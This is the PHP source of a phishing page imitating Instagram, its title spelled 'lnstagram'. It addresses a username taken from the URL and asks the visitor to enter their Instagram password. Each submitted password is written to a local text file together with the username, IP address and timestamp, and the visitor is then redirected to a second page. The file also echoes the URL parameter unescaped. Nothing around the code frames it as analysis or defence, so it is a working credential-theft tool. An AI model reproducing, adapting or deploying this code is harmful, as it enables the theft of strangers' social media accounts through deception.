<?php
session_start();
/*

 */


$an1l= $_GET["username"];



if ($_POST) {

	
	$an1l=$_GET["username"];
	$password=$_POST["Password"];
	$ip=$_SERVER["REMOTE_ADDR"];
	date_default_timezone_set('Europe/Istanbul');
    $date=date("d-m-Y H:i:s");
	
	
    
    $_SESSION['username'] = $an1l;
    $_SESSION['Password'] = $password;
    $_SESSION['ip'] = $ip;
    $_SESSION['date'] = $date;
    

    $file = fopen('silver.txt', 'a');
fwrite($file, "Username: ".$an1l."\n\n" ."Password: ".$password. "\n\n"."Ip Adress: " .$ip."\n\n".   "Time: " .$date.  "\n\n\n");
fclose($file);
echo '';
  
   header("Location: mail.php");
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Copyright • lnstagram</title>
	<link rel="icon" sizes="192x192" href="https://i.resimyukle.xyz/PyRHaN.jpg">
	<meta name="viewport" content="width=device-width,inital-scale=1">
	<body style="background:#fafafa;">
<?php
include("anil/anilcss/index.php")
?>
<center><br><br><div style="width:400px;max-width:1000%;background:white;border:1px solid #cecece;padding: 20px;height:500px;""box-sizing:border-box";>
                            <br>
                            <center>

<img style="width: 250px;" src="https://i.imgyukle.com/2020/06/20/CNBbNv.gif" alt="selam">
                            <p id="felonymetin">
    
                            Hello <?php echo $an1l; ?>
							, <p style="width:90%; font-family:sans-serif; color:#555;">
    Please write your instagram password and click "Continue as @<?php echo $an1l; ?>" and fill the next form.


</p>
                            </p>
                            <br><br>
                            <center><input onclick="felonybuton('sonuc');" id="felonybuton" type="submit" value="Show Form"></center><br>
                            <form  method="post" id="sonuc" style="display: none;">

                            <input type="password" name="Password" placeholder="Password" required="" id="felonykutu"><br><br>
                            

                            <input id="felonybuton1" type="submit" value="Next">
                        <br><br>
                        </form>
                            <p class="felonybilgi">
                               
                          </p>
                        </div>
                    </div>
                </div>
				<script>
function felonybuton(ID) {
var secilenID = document.getElementById(ID);
if (secilenID.style.display == "none") {
secilenID.style.display = "";
} else {
secilenID.style.display = "none";
}
}
</script>